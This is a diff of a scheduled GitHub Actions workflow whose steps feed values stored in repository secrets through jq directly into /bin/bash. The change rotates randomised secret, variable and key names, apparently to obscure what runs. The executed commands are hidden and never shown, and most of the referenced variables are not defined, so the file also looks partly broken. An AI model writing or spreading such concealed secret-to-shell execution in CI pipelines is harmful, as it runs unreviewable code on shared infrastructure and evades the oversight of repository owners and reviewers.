@@ -1,23 +1,27 @@
 name: nvmengmeidao
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 4/6 * * *'
-jobs:  # 29853
+    - cron: '34 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: nvmengmeidao
         env:
-          l03867: ${{ secrets.l03867 }}
+          kba9847: ${{ secrets.kba9847 }}
         run: |
-          echo $l03867 | jq -r .myp16142 | /bin/bash
-          echo $xveeq6 | jq -r .dbro675 | /bin/bash
-          echo $fqf691 | jq -r .md6256 | /bin/bash
-          echo $an213 | jq -r .mf7259 | /bin/bash
-          echo $xps689 | jq -r .mctu3 | /bin/bash
-          echo $g986 | jq -r .chc1731 | /bin/bash
-          echo $oz401 | jq -r .ndx42203 | /bin/bash
+          echo $kba9847 | jq -r .nuhjr48997 | /bin/bash
+          echo $tid34 | jq -r .tfo9039 | /bin/bash
+          echo $tvocn053 | jq -r .ib89936 | /bin/bash
+          echo $i07245 | jq -r .tntoh3 | /bin/bash
+          echo $egrfe27 | jq -r .tdyce64974 | /bin/bash
+          echo $ifdpg2865 | jq -r .s4645 | /bin/bash
+          echo $zfhfe85 | jq -r .rhgli72 | /bin/bash
+          echo $udekv36 | jq -r .xdqer33 | /bin/bash
+          echo $gvpuu7134 | jq -r .mcx473 | /bin/bash
+          echo $ogb3193 | jq -r .epl5 | /bin/bash
+          echo $rggkk62383 | jq -r .gatho5 | /bin/bash
 
